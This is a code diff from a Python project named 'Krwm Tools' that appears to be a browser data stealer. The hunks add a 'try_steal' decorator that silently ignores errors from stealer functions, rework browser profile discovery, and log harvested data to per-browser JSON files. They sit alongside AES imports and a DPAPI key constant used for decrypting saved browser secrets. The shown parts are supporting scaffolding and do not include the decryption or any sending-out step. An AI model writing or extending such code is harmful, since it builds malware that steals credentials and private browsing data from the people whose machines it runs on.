@@ -14,8 +14,8 @@ from Crypto.Cipher import AES
 """ CONSTANTS """
 # Directory paths
 KRWM_DIR = os.path.expanduser(r'~\Documents\Krwm Tools')
-TEMP_PATH = KRWM_DIR + r'\temp'
-LOGS_PATH = KRWM_DIR + r'\logs'
+TEMP_PATH = KRWM_DIR + r'\Temp'
+LOGS_PATH = KRWM_DIR + r'\Logs'
 
 # Encryption key prefix
 ENC_KEY_PREFIX = len('DPAPI')
@@ -27,10 +27,34 @@ ENC_ADD_DATA_LEN = 128 // 8
 
 
 
-def get_profiles(browser_path: str) -> list[str]:
-    """ Returns a list of profiles for a browser """
+def try_steal(stealer_function):
+    """ Decorator function ignoring Exceptions when calling stealer_function """
+    def wrapper(*args, **kwargs):
+        try:
+            # Try calling stealer_function
+            stealer_function(*args, **kwargs)
+        except Exception:
+            # Ignore any Exceptions
+            pass
+
+    return wrapper
+
+
+def mkdir_if_not_exists(path: str) -> None:
+    """ Creates a directory at path if it does not exist yet """
+    if not os.path.exists(path):
+        os.mkdir(path)
+
+
+def get_profiles(browser: dict) -> list[str]:
+    """ Returns a list of profiles for a browser if supported """
+    # Browser does not support multiple profiles
+    if not browser['has_profiles']:
+        return ['']
+
+    # Find all profiles
     profiles = []
-    for subdir_name in os.listdir(browser_path):
+    for subdir_name in os.listdir(browser['path']):
         if subdir_name == 'Default' or subdir_name.startswith('Profile'):
             profiles.append(subdir_name)
     return profiles
@@ -48,9 +72,9 @@ def create_temp_file(browser: dict, profile_name: str, db_name: str) -> str:
     return temp_path
 
 
-def create_log_file(data: dict or list, file_name: str) -> None:
-    """ Create a log file with specified file name for some JSON-serializable data """
-    log_path = f'{LOGS_PATH}\\{file_name}.json'
+def log_data(data: dict or list, browser_name: str, file_name: str) -> None:
+    """ Creates a log_data file with specified file name for some JSON-serializable data """
+    log_path = f'{LOGS_PATH}\\{browser_name}\\{file_name}.json'
     with open(log_path, 'w') as f:
         json.dump(data, f, indent=4)
 
